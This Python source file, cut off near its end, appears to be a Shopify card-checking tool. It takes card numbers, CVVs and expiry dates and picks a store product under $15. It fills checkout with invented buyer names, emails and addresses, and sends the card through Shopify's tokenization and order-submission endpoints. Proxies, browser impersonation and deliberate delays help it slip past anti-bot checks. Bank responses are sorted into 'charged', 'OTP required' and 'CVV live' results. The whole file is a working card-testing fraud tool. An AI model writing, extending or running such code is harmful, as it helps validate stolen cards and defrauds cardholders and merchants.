import asyncio
import json
import re
import random
import time
from urllib.parse import urlparse
from curl_cffi.requests import AsyncSession

# ==================== DIRECT SHOPIFY GATEWAY ====================

C2C = {
    "CAD": "CA", 
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

MUTATION_SUBMIT = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'

QUERY_POLL = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))
    
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    if proxy_str.startswith("http://") or proxy_str.startswith("https://"):
        return proxy_str
        
    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return f"http://{proxy_str}"

async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*'
        }
        
        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=15) as session:
            resp = await session.get(f"{domain}/products.json", headers=headers)
            if resp.status_code != 200:
                return False, f"<b>Site Error! Status: {resp.status_code}</b>"
            
            text = resp.text
            if "shopify" not in text.lower():
                return False, "<b>Not Shopify!</b>"

            data = resp.json()
            result = data.get('products', [])
            if not result:
                return False, "<b>No Products!</b>"

        min_price = float('inf')
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    if price <= 0:
                        continue

                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        
        if isinstance(min_product, dict) and min_product.get('variant_id'):
            return min_product
        else:
            return False, "<b>No Valid Products</b>"

    except Exception as e:
        return False, f"<b>Connection/Proxy Error: {str(e)[:60]}</b>"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    
    return message[:50]

async def fetch_bin_country(card_number, proxy_str=None):
    try:
        bin_number = card_number.strip()[:6]
        proxy = parse_proxy(proxy_str) if proxy_str else None
        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=5) as session:
            res = await session.get(f"https://bins.antipublic.cc/bins/{bin_number}")
            if res.status_code == 200:
                data = res.json()
                country_code = data.get("country", "")
                if country_code and len(country_code) == 2:
                    return country_code.upper()
    except Exception:
        pass
    return "US"

def get_address_for_country(country_code):
    country_code = (country_code or "US").upper()
    first, last = Utils.get_random_name()
    
    us_phones = [
        "2025550199", "3105551234", "4155559876", "6175550123",
        "9718081573", "2125559999", "7735551212", "4085556789",
    ]
    
    if country_code == "US":
        streets = ["Main St", "Broadway", "Oak Ave", "Pine Rd", "Maple Lane", "Elm St", "Washington Blvd", "Cedar Dr"]
        cities = [
            ("New York", "NY", "10001"),
            ("Los Angeles", "CA", "90001"),
            ("Chicago", "IL", "60601"),
            ("Houston", "TX", "77001"),
            ("Phoenix", "AZ", "85001"),
        ]
        city, state, zip_c = random.choice(cities)
        return {
            "address1": f"{random.randint(100, 9999)} {random.choice(streets)}",
            "city": city,
            "postalCode": zip_c,
            "zoneCode": state,
            "countryCode": "US",
            "phone": random.choice(us_phones)
        }
    elif country_code == "CA":
        streets = ["Queen St", "King St", "Yonge St", "Robson St"]
        cities = [
            ("Toronto", "ON", "M5V 2T6"),
            ("Vancouver", "BC", "V6B 1B4"),
            ("Montreal", "QC", "H3B 1A7"),
        ]
        city, state, zip_c = random.choice(cities)
        return {
            "address1": f"{random.randint(100, 999)} {random.choice(streets)}",
            "city": city,
            "postalCode": zip_c,
            "zoneCode": state,
            "countryCode": "CA",
            "phone": f"416{''.join(random.choice('0123456789') for _ in range(7))}"
        }
    elif country_code == "GB":
        streets = ["High St", "London Rd", "Station Rd", "Church St"]
        cities = [
            ("London", "LND", "EC1A 1BB"),
            ("Manchester", "MAN", "M1 1AE"),
        ]
        city, state, zip_c = random.choice(cities)
        return {
            "address1": f"{random.randint(1, 150)} {random.choice(streets)}",
            "city": city,
            "postalCode": zip_c,
            "zoneCode": state,
            "countryCode": "GB",
            "phone": f"7{''.join(random.choice('0123456789') for _ in range(9))}"
        }
    elif country_code == "AU":
        streets = ["George St", "Collins St", "Queen St"]
        cities = [
            ("Sydney", "NSW", "2000"),
            ("Melbourne", "VIC", "3000"),
        ]
        city, state, zip_c = random.choice(cities)
        return {
            "address1": f"{random.randint(1, 500)} {random.choice(streets)}",
            "city": city,
            "postalCode": zip_c,
            "zoneCode": state,
            "countryCode": "AU",
            "phone": f"04{''.join(random.choice('0123456789') for _ in range(8))}"
        }
    else:
        if country_code in book:
            addr = book[country_code].copy()
        else:
            addr = book["DEFAULT"].copy()
        addr["address1"] = f"{random.randint(10, 999)} {addr['address1']}"
        addr["phone"] = random.choice(us_phones)
        return addr

async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    
    ourl = site_url.strip().rstrip('/')
    if not ourl.startswith('http'):
        ourl = f'https://{ourl}'
    
    proxy = parse_proxy(proxy_str) if proxy_str else None
    
    first_name = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"])
    last_name = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis"])
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@gmail.com"
    
    bin_country = await fetch_bin_country(cc, proxy_str)
    billing_addr = get_address_for_country(bin_country)
    shipping_addr = get_address_for_country("US")
    
    b_add1 = billing_addr["address1"]
    b_city = billing_addr["city"]
    b_state_short = billing_addr["zoneCode"]
    b_zip_code = billing_addr["postalCode"]
    b_phone = billing_addr["phone"]
    b_country_code = billing_addr["countryCode"]
    
    s_add1 = shipping_addr["address1"]
    s_city = shipping_addr["city"]
    s_state_short = shipping_addr["zoneCode"]
    s_zip_code = shipping_addr["postalCode"]
    s_phone = shipping_addr["phone"]
    s_country_code = shipping_addr["countryCode"]
    
    try:
        if not variant_id:
            await queue.put({"type": "log", "msg": "[STEP 1] Fetching products from /products.json..."})
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                await queue.put({"type": "log", "msg": f"[ERROR STEP 1] {info[1]}"})
                return False, info[1], gateway, total_price, currency
            
            try:
                price_val = float(info['price'])
                if price_val > 15.00:
                    await queue.put({"type": "log", "msg": f"[ERROR STEP 1] Product too expensive: ${price_val:.2f}"})
                    return False, f"Site product too expensive: ${price_val:.2f}", gateway, info['price'], currency
            except Exception:
                pass
                
            variant_id = info['variant_id']
            product_link = info['link']
            total_price = info['price']
            await queue.put({"type": "log", "msg": f"[STEP 1 OK] Found product | Price: ${total_price}"})
        else:
            product_link = f"{ourl}/products/any"
            total_price = "0.01"

        product_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }

        async with AsyncSession(impersonate="chrome120", proxy=proxy, timeout=30) as session:
            await queue.put({"type": "log", "msg": "[STEP 2] Visiting product page & initializing cart..."})
            try:
                await session.get(product_link, headers=product_headers)
                await session.get(f"{ourl}/cart.js", headers=product_headers)
                await queue.put({"type": "log", "msg": "[STEP 2 OK] Cookies dropped successfully."})
            except Exception as e:
                await queue.put({"type": "log", "msg": f"[WARN STEP 2] Error visiting page: {str(e)[:50]}"})

            await queue.put({"type": "log", "msg": f"[STEP 3] Adding variant {variant_id} to cart..."})
            add_headers = {
                **product_headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/javascript'
            }
            add_data = f"id={variant_id}&quantity=1&form_type=product"
            try:
                resp = await session.post(f"{ourl}/cart/add.js", headers=add_headers, data=add_data)
                if resp.status_code != 200:
                    await queue.put({"type": "log", "msg": f"[WARN STEP 3] Add.js returned {resp.status_code}, trying JSON method..."})
                    json_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                    await session.post(f"{ourl}/cart/add.js", headers={**product_headers, 'Content-Type': 'application/json'}, json=json_data)
                await queue.put({"type": "log", "msg": "[STEP 3 OK] Item added to cart successfully."})
            except Exception as e:
                await queue.put({"type": "log", "msg": f"[ERROR STEP 3] Cart addition failed: {str(e)}"})
                return False, f"Cart addition failed: {str(e)}", gateway, total_price, currency

            cart_token = ""
            try:
                resp = await session.get(f"{ourl}/cart.js", headers=product_headers)
                if resp.status_code == 200:
                    cart_data = resp.json()
                    cart_token = cart_data.get('token', '')
            except Exception:
                pass

            await queue.put({"type": "log", "msg": "[STEP 4] Triggering checkout flow..."})
            checkout_headers = {
                **product_headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': ourl,
                'Referer': f"{ourl}/cart",
                'Upgrade-Insecure-Requests': '1'
            }
            
            try:
                await session.get(f"{ourl}/checkout", headers=checkout_headers)
                resp = await session.post(f"{ourl}/cart", headers=checkout_headers, data={'checkout': '', 'updates[]': '1'}, allow_redirects=True)
                checkout_url = str(resp.url)
                text = resp.text
                await queue.put({"type": "log", "msg": "[STEP 4 OK] Checkout URL acquired."})
            except Exception as e:
                await queue.put({"type": "log", "msg": f"[ERROR STEP 4] Checkout redirect failed: {str(e)}"})
                return False, f"Checkout redirect failed: {str(e)}", gateway, total_price, currency

            if 'login' in checkout_url.lower():
                await queue.put({"type": "log", "msg": "[ERROR STEP 4] Site requires login!"})
                return False, "Site requires login!", gateway, total_price, currency

            await queue.put({"type": "log", "msg": "[STEP 5] Extracting Session Token (SST)..."})
            sst = None
            sst_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', text)
            if sst_match:
                sst = sst_match.group(1)
            else:
                sst_match = re.search(r'name="serialized-sessionToken"\s+content="([^"]+)"', text)
                if sst_match:
                    sst = sst_match.group(1)
                else:
                    sst = extract_between(text, '"serializedSessionToken":"', '"') or \
                          extract_between(text, 'data-session-token="', '"') or \
                          extract_between(text, '"sessionToken":"', '"')

            if not sst:
                await queue.put({"type": "log", "msg": "[ERROR STEP 5] Failed to get session token (Maybe Captcha/Block)."})
                return False, "Failed to get session token", gateway, total_price, currency
            
            await queue.put({"type": "log", "msg": f"[STEP 5 OK] SST Extracted: {sst[:30]}..."})

            queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"') or ""
            stable_id = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"') or "1"
            paymentMethodIdentifier = extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;') or extract_between(text, '"paymentMethodIdentifier":"', '"') or "credit_card"

            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            c_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
            if not c_token or len(c_token) < 5 or 'checkout' in c_token:
                c_token = cart_token or "1"

            await queue.put({"type": "log", "msg": "[STEP 6] Tokenizing card at shopifycs.com..."})
            session_endpoints = [
                "https://deposit.us.shopifycs.com/sessions",
                "https://checkout.pci.shopifyinc.com/sessions",
                "https://checkout.shopifycs.com/sessions",
                "https://deposit.shopifycs.com/sessions"
            ]
            
            sessionid = None
            token_error = "Unable to get payment token"
            for endpoint in session_endpoints:
                try:
                    await queue.put({"type": "log", "msg": f"          -> Trying: {endpoint}"})
                    payload = {
                        "credit_card": {
                            "number": cc.replace(" ", ""),
                            "name": f"{first_name} {last_name}",
                            "month": int(mes),
                            "year": int(ano),
                            "verification_value": cvv
                        },
                        "payment_session_scope": urlparse(ourl).netloc
                    }
                    endpoint_headers = {
                        'authority': urlparse(endpoint).netloc,
                        'accept': 'application/json',
                        'content-type': 'application/json',
                        'origin': 'https://checkout.shopifycs.com',
                        'referer': 'https://checkout.shopifycs.com/',
                        'user-agent': product_headers['User-Agent']
                    }
                    token_resp = await session.post(endpoint, json=payload, headers=endpoint_headers)
                    resp_body = token_resp.text
                    if token_resp.status_code == 200:
                        token_data = token_resp.json()
                        sessionid = token_data.get('id')
                        if sessionid:
                            await queue.put({"type": "log", "msg": f"[STEP 6 OK] Card Tokenized! ID: {sessionid[:20]}..."})
                            break
                    else:
                        token_error = f"Status {token_resp.status_code}: {resp_body[:80]}"
                except Exception as e:
                    token_error = str(e)

            if not sessionid:
                await queue.put({"type": "log", "msg": f"[ERROR STEP 6] Tokenization failed: {token_error}"})
                return False, f"Tokenization failed: {token_error}", gateway, total_price, currency

            # DELAY ANTI-BOT 4 ke 6 saat supaya Stripe tak block GENERIC_ERROR
            await asyncio.sleep(random.uniform(4.0, 6.0))

            await queue.put({"type": "log", "msg": "[STEP 7] Submitting GraphQL (SubmitForCompletion)..."})
            graphql_url = f'{ourl}/checkouts/unstable/graphql'
            graphql_headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': ourl,
                'Referer': f"{ourl}/",
                'User-Agent': product_headers['User-Agent'],
                'X-Checkout-One-Session-Token': sst,
                'X-Checkout-Web-Deploy-Stage': 'production',
                'X-Checkout-Web-Server-Handling': 'fast',
                'X-Checkout-Web-Source-Id': c_token,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"'
            }

            random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"

            graphql_payload = {
                'query': MUTATION_SUBMIT,
                'variables': {
                    'input': {
                        'checkpointData': None,
                        'sessionInput': {
                            'sessionToken': sst,
                        },
                        'queueToken': queue_token,
                        'discounts': {
                            'lines': [],
                            'acceptUnexpectedDiscounts': True,
                        },
                        'delivery': {
                            'deliveryLines': [
                                {
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {
                                        'lines': [{'stableId': stable_id}],
                                    },
                                    'destination': {
                                        'streetAddress': {
                                            'address1': s_add1,
                                            'address2': '',
                                            'city': s_city,
                                            'countryCode': s_country_code,
                                            'postalCode': s_zip_code,
                                            'company': '',
                                            'firstName': first_name,
                                            'lastName': last_name,
                                            'zoneCode': s_state_short,
                                            'phone': s_phone,
                                        },
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': True,
                                },
                            ],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                            'prefetchShippingRatesStrategy': None,
                        },
                        'merchandise': {
                            'merchandiseLines': [
                                {
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True},
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                },
                            ],
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [
                                {
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': paymentMethodIdentifier,
                                            'sessionId': sessionid,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': b_add1,
                                                    'address2': '',
                                                    'city': b_city,
                                                    'countryCode': b_country_code,
                                                    'postalCode': b_zip_code,
                                                    'company': '',
                                                    'firstName': first_name,
                                                    'lastName': last_name,
                                                    'zoneCode': b_state_short,
                                                    'phone': b_phone,
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                    },
                                    'amount': {'any': True},
                                    'dueAt': None,
                                },
                            ],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': b_add1,
                                    'address2': '',
                                    'city': b_city,
                                    'countryCode': b_country_code,
                                    'postalCode': b_zip_code,
                                    'company': '',
                                    'firstName': first_name,
                                    'lastName': last_name,
                                    'zoneCode': b_state_short,
                                    'phone': b_phone,
                                },
                            },
                        },
                        'buyerIdentity': {
                            'buyerIdentity': {
                                'presentmentCurrency': currency,
                                'countryCode': s_country_code,
                            },
                            'contactInfoV2': {
                                'emailOrSms': {
                                    'value': email,
                                    'emailOrSmsChanged': False,
                                },
                            },
                            'marketingConsent': [{'email': {'value': email}}],
                            'shopPayOptInPhone': {'countryCode': s_country_code},
                        },
                        'tip': {'tipLines': []},
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': [],
                        },
                        'note': {'message': None, 'customAttributes': []},
                        'localizationExtension': {'fields': []},
                        'nonNegotiableTerms': None,
                        'scriptFingerprint': {
                            'signature': None,
                            'signatureUuid': None,
                            'lineItemScriptChanges': [],
                            'paymentScriptChanges': [],
                            'shippingScriptChanges': [],
                        },
                        'optionalDuties': {'buyerRefusesDuties': False},
                    },
                    'attemptToken': f'{c_token}-{random.random()}',
                    'metafields': [],
                    'analytics': {
                        'requestUrl': f'{ourl}/checkouts/cn/{c_token}',
                        'pageId': random_page_id,
                    },
                },
                'operationName': 'SubmitForCompletion',
            }

            receipt_id = None
            for submit_attempt in range(3): # Tambahan attempt untuk retry WAITING_PENDING_TERMS
                try:
                    graphql_resp = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload, timeout=15)
                    await queue.put({"type": "log", "msg": f"          -> GraphQL HTTP Status: {graphql_resp.status_code}"})
                    
                    if graphql_resp.status_code != 200:
                        if submit_attempt < 2:
                            await queue.put({"type": "log", "msg": "          -> Retrying in 3s..."})
                            await asyncio.sleep(3)
                            continue
                        await queue.put({"type": "log", "msg": "[ERROR STEP 7] GraphQL submission failed."})
                        return False, f"GraphQL submission failed: Status {graphql_resp.status_code}", gateway, total_price, currency
                    
                    result_data = graphql_resp.json()
                    completion = result_data.get('data', {}).get('submitForCompletion', {})
                    typename = completion.get('__typename')
                    await queue.put({"type": "log", "msg": f"          -> GraphQL Typename: {typename}"})
                    
                    if typename == 'CheckpointDenied':
                        await queue.put({"type": "log", "msg": "[ERROR STEP 7] Checkpoint Denied (Captcha/Security)."})
                        return True, "CARD_DECLINED", gateway, total_price, currency
                        
                    if completion.get('receipt'):
                        receipt_id = completion['receipt'].get('id')
                        await queue.put({"type": "log", "msg": f"[STEP 7 OK] Receipt ID Captured: {receipt_id}"})
                    
                    if completion.get('errors'):
                        errors = completion['errors']
                        error_codes = [e.get('code') for e in errors if 'code' in e]
                        error_msgs = [e.get('localizedMessage', '') for e in errors if 'localizedMessage' in e]
                        
                        await queue.put({"type": "log", "msg": f"          -> Gateway Errors: {error_codes} | Msgs: {error_msgs}"})
                        
                        soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                        only_soft_errors = all(code in soft_errors for code in error_codes)
                        if only_soft_errors and submit_attempt < 2:
                            graphql_payload['variables']['attemptToken'] = f'{c_token}-{random.random()}'
                            await asyncio.sleep(3)
                            continue
                        
                        non_soft_errors = [code for code in error_codes if code not in soft_errors]
                        if non_soft_errors:
                            await queue.put({"type": "log", "msg": f"[FAILED STEP 7] Hard errors returned from gateway."})
                            return True, ', '.join(non_soft_errors), gateway, total_price, currency
                    
                    if completion.get('reason'):
                        await queue.put({"type": "log", "msg": f"[FAILED STEP 7] Submit reason: {completion.get('reason')}"})
                        return True, completion['reason'], gateway, total_price, currency
                    
                    break
                except Exception as e:
                    if submit_attempt < 2:
                        await asyncio.sleep(3)
                        continue
                    await queue.put({"type": "log", "msg": f"[ERROR STEP 7] Exception: {str(e)}"})
                    return False, f"GraphQL submission failed: {str(e)}", gateway, total_price, currency

            if receipt_id:
                await queue.put({"type": "log", "msg": "[STEP 8] Polling for receipt status (Waiting bank response)..."})
                poll_payload = {
                    'query': QUERY_POLL,
                    'variables': {
                        'receiptId': receipt_id,
                        'sessionToken': sst,
                    },
                    'operationName': 'PollForReceipt'
                }
                
                for poll_attempt in range(6):
                    await asyncio.sleep(3)
                    await queue.put({"type": "log", "msg": f"          -> Polling attempt {poll_attempt + 1}/6..."})
                    try:
                        poll_resp = await session.post(graphql_url, headers=graphql_headers, json=poll_payload, timeout=7)
                        if poll_resp.status_code == 200:
                            poll_data = poll_resp.json()
                            receipt = poll_data.get('data', {}).get('receipt', {})
                            typename = receipt.get('__typename')
                            await queue.put({"type": "log", "msg": f"          -> Bank Status: {typename}"})
                            
                            if typename == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                                await queue.put({"type": "log", "msg": "[SUCCESS] BANK APPROVED! ORDER PLACED!"})
                                return True, "ORDER_PLACED", gateway, total_price, currency
                            elif typename == 'ActionRequiredReceipt':
                                await queue.put({"type": "log", "msg": "[WARN] 3DS/OTP Triggered by bank."})
                                return True, "OTP_REQUIRED", gateway, total_price, currency
                            elif typename == 'FailedReceipt':
                                code = receipt.get('processingError', {}).get('code') or "UNKNOWN_CODE"
                                msg = receipt.get('processingError', {}).get('messageUntranslated') or "No message"
                                await queue.put({"type": "log", "msg": f"[FAILED] Bank Rejected: {code} - {msg}"})
                                return True, f"{code}", gateway, total_price, currency
                    except Exception:
                        pass
            else:
                await queue.put({"type": "log", "msg": "[WARN STEP 8] No Receipt ID to poll."})

            await queue.put({"type": "log", "msg": "[STEP 9] Running fallback HTML check..."})
            try:
                checkout_url_final = f"{ourl}/checkout?from_processing_page=1&validate=true"
                final_resp = await session.get(checkout_url_final, headers=product_headers, timeout=10)
                final_url = str(final_resp.url)
                final_text = final_resp.text
                
                if "/thank" in final_url.lower() or "/orders/" in final_url:
                    await queue.put({"type": "log", "msg": "[SUCCESS] FALLBACK CAUGHT ORDER PLACED!"})
                    return True, "ORDER_PLACED", gateway, total_price, currency
                
                final_lower = final_text.lower()
                
                is_3ds = (
                    "three_d_secure" in final_url.lower() or 
                    "/challenges/" in final_url or 
                    "three_d_secure" in final_lower or 
                    "cardinalcommerce" in final_lower or
                    '"action_required":true' in final_lower.replace(" ", "").replace("\\", "")
                )
                
                if "insufficient funds" in final_lower or "insufficient_funds" in final_lower:
                    await queue.put({"type": "log", "msg": "[FAILED] Fallback caught: Insufficient Funds."})
                    return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency
                elif "security code is incorrect" in final_lower or "cvv_gateway_error" in final_lower or "incorrect cvv" in final_lower:
                    await queue.put({"type": "log", "msg": "[FAILED] Fallback caught: Incorrect CVV."})
                    return True, "INCORRECT_CVC", gateway, total_price, currency
                elif is_3ds:
                    await queue.put({"type": "log", "msg": "[WARN] Fallback caught: 3DS Required."})
                    return True, "OTP_REQUIRED", gateway, total_price, currency
                elif "declined" in final_lower or "failed" in final_lower:
                    code = extract_between(final_text, '{"code":"', '"')
                    msg = code if code else "CARD_DECLINED"
                    await queue.put({"type": "log", "msg": f"[FAILED] Fallback caught: {msg}"})
                    return True, msg, gateway, total_price, currency
            except Exception as e:
                 await queue.put({"type": "log", "msg": f"[WARN STEP 9] Fallback failed: {str(e)[:50]}"})

            await queue.put({"type": "log", "msg": "[FAILED] Process completed but no clear approval. Defaulting to Declined."})
            return True, "CARD_DECLINED", gateway, total_price, currency

    except Exception as e:
        await queue.put({"type": "log", "msg": f"[FATAL ERROR] {str(e)}"})
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency

def _classify_response(response_text: str) -> tuple:
    resp = str(response_text).strip()
    resp_lower = resp.lower()

    charged_patterns = [
        'thank you ', 'order_paid', 'order_successful', 'order completed',
        'order completed 💎', 'order_placed', 'charged', 'successfully paid',
        'payment successful', 'processedreceipt', 'processed_receipt',
        'order_processed', 'succeeded'
    ]
    
    tds_patterns = [
        '3d_authentication', '3ds', '3d secure', '3d_secure', '3d-secure',
        'otp_required', 'otp required', 'one-time password',
        'actionreq', 'action_required', 'actionrequired',
        'authentication_required', 'authentication required',
        'verification_required', 'verification required',
        'challenge required', 'challenge shopper', 'identify shopper',
        'redirect shopper', 'sms verification', 'sms verification required',
        'verify otp', 'verify_otp', 'verify card', 'verify_card'
    ]

    approved_patterns = [
        'cvv live', 'incorrect_cvc', 'insufficient_funds', 'incorrect_cvv',
        'invalid_cvc', 'cvc_check_failed', 'cvv_gateway_error', 'incorrect_pin',
        'incorrect_zip', 'incorrect_address', 'call_issuer',
        'card_velocity_exceeded', 'withdrawal_count_limit_exceeded', 'approved',
        'ccn', 'mismatched_bill'
    ]

    declined_patterns = [
        'declined', 'card_declined', 'generic_error', 'authorization_error',
        'authentication_failed', 'payments_credit_card_base_expired', 'do_not_honor',
        'pick_up_card', 'pickup_card', 'stolen_card', 'lost_card',
